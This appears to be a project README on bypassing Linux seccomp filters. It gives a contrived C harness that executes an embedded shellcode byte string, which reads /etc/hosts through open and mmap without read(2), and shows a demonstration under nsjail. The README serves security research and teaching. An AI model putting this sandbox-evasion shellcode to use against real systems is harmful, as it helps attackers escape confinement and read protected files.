# seccomp-bypass
seccomp is used by applications to restrict system calls it can make, thus sandboxing it. Its goal is to limit the application to only the facilities it needs to perform its job and nothing more.

The goal here is to bypass these seccomp restrictions when exploiting applications. So you need shellcode that will carry out its purpose while still adhering to the seccomp filter in place. So if the filter specifies a denial of `read` and `write`, then valid shellcode may use any system call but those.

# Premise
A typical exploit scenario is that you have a vulnerable application into which you can inject shell code. The code below is a contrived application that just executes the shell code we specify.* So no vulnerability is required, but it suffices to prove the point.

&gt;:cat read-with-mmap.c
```
#include <stdint.h>
#include <sys/mman.h>

char shellcode[] = "\x66\x41\xbb\x74\x73\x41\x53\x49\xbb\x2f\x65\x74\x63\x2f\x68"
                   "\x6f\x73\x41\x53\x48\x8d\x3c\x24\x48\x31\xf6\x04\x02\x0f\x05"
                   "\x48\x31\xff\x48\x31\xf6\x66\xbe\xff\xff\x48\x31\xd2\x80\xc2"
                   "\x01\x49\x89\xc0\x4d\x31\xc9\x4d\x31\xd2\x41\x80\xc2\x01\x48"
                   "\x31\xc0\xb0\x09\x0f\x05\x48\x31\xff\xfe\xc2\x48\x89\xc6\x48"
                   "\x31\xd2\x66\xba\xff\xff\x48\x31\xc0\xfe\xc0\x0f\x05\x48\x31"
                   "\xff\xb2\x03\x48\x31\xc0\xb0\x3c\x0f\x05";

int main(){
  mprotect((void *)((uint64_t)shellcode & ~4095), 4096, PROT_READ|PROT_EXEC);
  (*(void(*)()) shellcode)();
  return 0;
}
```
 *Compile it with: `$gcc -static read-with-mmap.c -o read-with-mmap`

# Examples
Below are examples of shellcode that performs the specified action in the case where the specified system calls are disallowed. The shellcode is derived by running `src/gen-shellcode.sh $file.s`.

## Read a file from the filesystem
### Syscalls used: `open`,`close`,`write`, `mmap`
This example is based on shellcode from `src/read-with-mmap.s` that reads a target's `/etc/hosts` file without using read(2). You can see the line `127.0.0.1	localhost` present in the output below.

To follow along, use [Google's nsjail](https://github.com/google/nsjail) to run programs with a specific seccomp policy. Try replacing `read` with any of `open`,`close`,`write`, or `mmap` in the DENY clause. Doing so should cause the command to fail because the shellcode in this example uses all four of those calls.
```
>:~/nsjail/nsjail -Mo --chroot / --seccomp_string 'POLICY a { DENY { read } } USE a DEFAULT ALLOW' -- $HOME/seccomp-bypass/read-with-mmap
[2017-05-12T16:48:04-0700] Mode: STANDALONE_ONCE
...
[2017-05-12T16:48:04-0700] Uid map: inside_uid:360840 outside_uid:360840
[2017-05-12T16:48:04-0700] Gid map: inside_gid:5000 outside_gid:5000
[2017-05-12T16:48:04-0700] Executing '/home/unixist/seccomp-bypass/read-with-mmap' for '[STANDALONE_MODE]'
127.0.0.1	localhost
>:
```

### Syscalls used: `open`, `sendfile`
coming soon
